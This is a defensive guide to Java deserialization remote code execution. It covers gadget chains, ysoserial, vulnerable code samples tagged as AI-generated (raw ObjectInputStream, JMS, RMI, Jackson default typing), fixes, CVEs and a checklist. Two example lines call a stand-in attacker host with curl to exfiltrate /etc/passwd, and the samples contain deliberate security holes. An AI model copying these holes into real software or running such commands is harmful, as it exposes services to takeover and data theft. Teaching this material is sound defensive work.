# Java Deserialization RCE — The Most Dangerous Java Vulnerability

## Introduction

Java's native serialization mechanism (`ObjectInputStream.readObject()`) has been described as "the single most dangerous API in the Java ecosystem." The vulnerability arises when an application deserializes untrusted data — an attacker can craft serialized byte streams that, when deserialized, trigger arbitrary code execution via **gadget chains**.

## How Java Deserialization Works

Java serialization converts an object graph into a byte stream, including class metadata. Deserialization reconstructs objects by reading this stream. The danger: `readObject()` calls the `readObject()` method of classes being deserialized, which can trigger arbitrary operations — including method calls that an attacker orchestrates into a chain ending in RCE.

## The Gadget Chain Concept

A **gadget chain** is a series of method calls that, composed together, allow arbitrary code execution. The chain uses legitimate classes from popular libraries that happen to perform dangerous operations during deserialization.

### Classic Commons-Collections Gadget Chain (ysoserial)

```java
// Simplified chain: InvokerTransformer → ChainedTransformer → LazyMap → AnnotationInvocationHandler
// 
// 1. InvokerTransformer.invoke() calls any method via reflection
// 2. ChainedTransformer chains multiple calls
// 3. LazyMap.get() triggers transform() when key not found
// 4. AnnotationInvocationHandler.invoke() triggers LazyMap.get()
// 
// End result: Runtime.exec("curl attacker.com/steal")
```

The `ysoserial` tool (https://github.com/frohoff/ysoserial) provides pre-built gadget chains for dozens of libraries:

| Library | Gadget Chain |
|---|---|
| Commons Collections 3.2.1 | `CommonsCollections1` through `CommonsCollections6` |
| Commons Collections 4.x | `CommonsCollections2` through `CommonsCollections4` |
| Spring | `Spring1`, `Spring2` |
| Jackson | `Jackson1`, `Jackson2` |
| Jodd | `Jodd1` |
| Hibernate | `Hibernate1`, `Hibernate2` |
| C3P0 | `C3P0` |

## AI-Generated Vulnerability: Direct Deserialization

```java
// AI-GENERATED — deserializes untrusted data from HTTP request
@PostMapping("/api/data")
public String processData(@RequestBody byte[] data) {
    try {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object obj = ois.readObject(); // RCE if data contains gadget chain!
        return "Processed: " + obj.toString();
    } catch (Exception e) {
        return "Error";
    }
}
```

**Exploit**: An attacker sends a serialized Commons-Collections gadget chain with `Runtime.getRuntime().exec("curl http://attacker.com/exfil?file=/etc/passwd")`.

**Secure Fix**: Don't use Java serialization for untrusted data. Use JSON/Protobuf.
```java
@PostMapping("/api/data")
public String processData(@RequestBody String jsonData) {
    // Use Jackson/Gson for JSON parsing
    MyObject obj = objectMapper.readValue(jsonData, MyObject.class);
    return "Processed: " + obj.toString();
}
```

## AI-Generated Vulnerability: JMS Message Deserialization

```java
// AI-GENERATED — deserializes messages from JMS queue
public void onMessage(Message message) {
    if (message instanceof ObjectMessage) {
        try {
            ObjectMessage objMsg = (ObjectMessage) message;
            Object obj = objMsg.getObject(); // RCE via malicious message!
            process(obj);
        } catch (JMSException e) {
            log.error("Error", e);
        }
    }
}
```

## AI-Generated Vulnerability: RMI Deserialization

```java
// AI-GENERATED — RMI server accepting arbitrary classes
public class RMIServer {
    public static void main(String[] args) {
        // By default, RMI accepts remote codebase URLs
        // Attacker can make the server deserialize classes from attacker-controlled server
        System.setProperty("java.rmi.server.useCodebaseOnly", "false"); // BUG!
        LocateRegistry.createRegistry(1099);
        // ...
    }
}
```

## JSON Deserialization Attacks (Jackson/Fastjson)

Java JSON libraries also have deserialization vulnerabilities, though different from native serialization:

```java
// AI-GENERATED — Jackson with polymorphic deserialization
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // BUG: Enables polymorphic deserialization!
// Attacker supplies JSON with @class field pointing to a gadget class
MyObject obj = mapper.readValue(json, MyObject.class);
```

**Secure Fix**:
```java
ObjectMapper mapper = new ObjectMapper();
// Disable default typing — be explicit about types
// If polymorphic deserialization is needed, use a strict whitelist:
mapper.activateDefaultTyping(
    BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("com.myapp.model.") // Only our model classes
        .build(),
    ObjectMapper.DefaultTyping.NON_FINAL
);
```

## Detection of Vulnerable Libraries

```bash
# Use OWASP Dependency-Check to find vulnerable versions
mvn org.owasp:dependency-check-maven:check

# Or check specifically for common gadgets
# Search for problematic imports:
grep -r "org.apache.commons.collections" src/
grep -r "com.esotericsoftware.kryo" src/
grep -r "com.fasterxml.jackson" src/
```

## Fixing the Classpath

The most common fix for deserialization RCE is removing gadget libraries from the classpath — but this is impractical for large enterprise apps. The better approach:

1. **Use a deserialization filter** (Java 9+, backported to 8u121+)
2. **Validate classes before deserialization**

```java
// Secure deserialization with filter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;java.lang.*;!*" // Only allow specific packages
);

try (ObjectInputStream ois = new ObjectInputStream(inputStream)) {
    ois.setObjectInputFilter(filter); // Rejects gadget classes
    Object obj = ois.readObject();
}
```

## Real CVEs

- **CVE-2015-7501 (Apache Commons Collections via Red Hat JBoss)**: CVSS 9.8 — The original deserialization RCE. Remote attackers execute arbitrary commands via a crafted serialized Java object, using the Apache Commons Collections `InvokerTransformer` gadget chain, against JBoss/application servers that deserialize untrusted input. This single vulnerability class compromised thousands of Java applications; mitigated by Commons Collections 3.2.2 (which disables the dangerous transformers by default).
- **CVE-2016-1000027 (Spring Framework)**: CVSS 9.8 — Spring Framework through 5.3.16 is vulnerable to remote code execution when used to deserialize untrusted data (e.g. `HttpInvokerServiceExporter` / `RemoteInvocationSerializingExporter`). Not fixed by configuration — the affected remoting classes were removed/blocked in Spring Framework 6.0.
- **CVE-2023-34040 (Spring for Apache Kafka)**: CVSS 7.8 — In Spring for Apache Kafka 3.0.9/2.9.10 and earlier, a deserialization attack vector exists when no `ErrorHandlingDeserializer` is configured AND the `checkDeserExWhenKeyNull`/`checkDeserExWhenValueNull` properties are enabled AND untrusted producers can publish to the topic — a malicious record's headers are deserialized into a gadget chain.
- **CVE-2019-12384 (FasterXML jackson-databind)**: CVSS 5.9 — jackson-databind 2.x before 2.9.9.1 failed to block the `logback-core` class from polymorphic deserialization; with default typing enabled, an attacker-supplied `@class` can reach a gadget (SSRF / arbitrary file read → RCE). One of a long series of jackson-databind polymorphic-typing blacklist bypasses.

## Prevention Checklist

1. **Never deserialize untrusted data** — If you must accept binary data, use Protocol Buffers, FlatBuffers, or CBOR instead.
2. **Replace Java serialization with JSON** — Jackson/Gson do not have the same RCE surface (when configured safely).
3. **Use `ObjectInputFilter`** — Java 9+ provides deserialization filtering at the JVM level.
4. **Update vulnerable libraries** — Commons Collections 3.2.2+ includes fix, Log4j 2.17+, Jackson 2.13+.
5. **Remove unused gadget libraries** — Audit classpath for `commons-collections`, `c3p0`, `bsh`, `groovy`.
6. **Never use `enableDefaultTyping()` in Jackson** — Use `activateDefaultTyping()` with a safe validator.
7. **Run ysoserial against your own app** — Security test: if ysoserial generates a working payload, you're vulnerable.
8. **Use `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false`** — Blocks RMI remote class loading.
9. **Run OWASP Dependency-Check** — Every build.
